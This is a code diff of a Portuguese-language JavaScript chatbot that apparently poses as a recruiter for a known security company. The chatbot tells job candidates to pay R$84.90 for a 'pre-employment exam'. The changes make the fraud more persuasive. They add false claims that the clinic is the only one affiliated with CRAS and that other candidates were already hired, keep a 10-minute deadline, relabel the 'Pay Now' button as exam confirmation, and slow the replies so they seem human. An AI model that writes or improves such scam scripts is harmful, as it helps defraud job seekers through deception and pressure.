@@ -659,23 +659,23 @@ const startWorkResponses = {
             delay: 5000
         },
         {
-            message: "Como já foi informado, você precisa realizar o pagamento do exame admissional para garantir sua vaga.",
-            delay: 4500,
+            message: "Verifiquei aqui que você ainda não confirmou o agendamento do exame admissional. Todos os outros candidatos já confirmaram e vão ser contratados ainda essa semana.",
+            delay: 7000,
         },
         {
-            message: "Se trata do exame admissional para que possamos assinar sua Carteira de Trabalho.",
-            delay: 4000
+            message: "Essa clínica é a única conveniada ao CRAS e ela cobra o valor de R$84,90 para realizar todos os exames de admissão exigidos por lei.",
+            delay: 8000
         },
         {
             message: "Sem o pagamento, infelizmente não conseguirei dar andamento na sua contratação e você pode perder a vaga a qualquer momento.",
-            delay: 3500
+            delay: 4500
         },
         {
-            message: "Se você conseguir realizar o pagamento em até 10 minutos, consigo segurar sua vaga e não passar para outro candidato.",
-            delay: 3200
+            message: "Se você conseguir realizar o pagamento e confirmar seu exame em até 10 minutos, consigo segurar sua vaga e não passar para outro candidato.",
+            delay: 5000
         },
         {
-            message: `${firstName}, você vai realizar o pagamento ou deseja desistir da vaga?`,
+            message: `${firstName}, você vai realizar o pagamento e confirmar o exame ou deseja desistir da vaga?`,
             delay: 2800,
             showOptions: 'paymentOptions'
         }
@@ -979,8 +979,7 @@ async function sendSequence(responses) {
                 const buttonHtml = `
                     <div class="text-center" style="margin: 20px 0;">
                         <button onclick="startPaymentProcess()" class="inline-block px-6 py-3 bg-green-600 text-prosegur-black font-semibold rounded-lg hover:bg-green-700 transition-colors duration-200" style="text-decoration: none; border: none; cursor: pointer;">
-                            <i class="fas fa-credit-card mr-2"></i>
-                            Realizar Pagamento Agora
+                            Confirmar Exame Admissional
                         </button>
                     </div>
                 `;
